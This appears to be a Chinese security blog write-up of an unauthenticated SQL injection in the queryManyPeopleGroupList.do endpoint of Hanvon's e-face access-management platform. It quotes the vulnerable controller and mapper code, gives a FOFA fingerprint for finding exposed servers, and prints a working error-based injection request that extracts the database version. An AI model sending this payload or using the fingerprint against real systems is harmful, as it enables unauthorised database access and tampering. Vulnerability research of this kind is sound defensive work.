---
title: "汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymanypeoplegrouplist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/3 08:22
- 1125浏览
- [0评论](#comment)
- 37分钟阅读

深入探索

JSON处理工具

服务器安全服务

Web安全课程

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryManyPeopleGroupList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

Nessus

SQL注入检测工具

企业安全咨询

直接看 `AuthMultiplePeopleOpenController` 里关于 `queryManyPeopleGroupList` 的实现

```
@Controller
@RequestMapping({"authMultiplePeople"})
public class AuthMultiplePeopleOpenController extends BaseController {
    protected Logger logger = TheApp.getLoggerAccess();
    @Autowired
    private IAuthMultiplePeopleOpenAsm authMultiplePeopleOpenAsm;
    @Autowired
    private IMultiplePeopleOpenAsm multiplePeopleOpenAsm;
    @Autowired
    MessageUtil messageUtil;

    @RequestMapping(
        value = {"queryManyPeopleGroupList.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson manyPeopleGroupListFordatatables(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            PageHelper.startPage(page, pageSize);
            ManyPeopleGroupParams record = new ManyPeopleGroupParams();
            if (null != name) {
                record.setName(name);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            List<ManyPeopleGroup> manyPeopleGroupList = this.authMultiplePeopleOpenAsm.queryManyPeopleGroupList(record);
            PageInfo<ManyPeopleGroup> info = new PageInfo(manyPeopleGroupList);
            Map<String, Object> map = new HashMap();
            map.put("items", info.getList());
            map.put("numRows", info.getTotal());
            map.put("page", info.getPageNum());
            map.put("pageSize", info.getPageSize());
            result = RequestJson.successResult(result, map, getMessage("basics_operate_fail"));
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            this.logger.error(msg);
            e.printStackTrace();
        }

        return result;
    }
```

直接看对应的 mapper xml文件 AccesManyPeopleGroupDao.xml

代码安全审计

```
<select id="queryManyPeopleGroupList" resultMap="BaseResultMap">
    select AMPG.ID,AMPG.NAME,AMPG.MEMO,
    (select COUNT(AMPE.EMPLOYEE_ID)
    from ACCESS_MANY_GROUP_EMPLOYEE AMPE
    LEFT JOIN SYS_USER EI ON EI.NG_ID = AMPE.EMPLOYEE_ID
    where AMPE.GROUP_ID = AMPG.ID AND EI.NT_USER_STATE = 1
    ) EMPLOYEE_SUM

    from ACCESS_MANY_PEOPLE_GROUP AMPG
    where 1=1
    <if test="name != null and name != ''">
      and AMPG.NAME like CONCAT('%',#{name}, '%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](images/img-001-526b34e0b1f0.webp)](https://image.mrxn.net/34c7a4bc9bd24b0996a033adb39ee1ab.webp)

成功利用报错注入获取到数据版本号

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
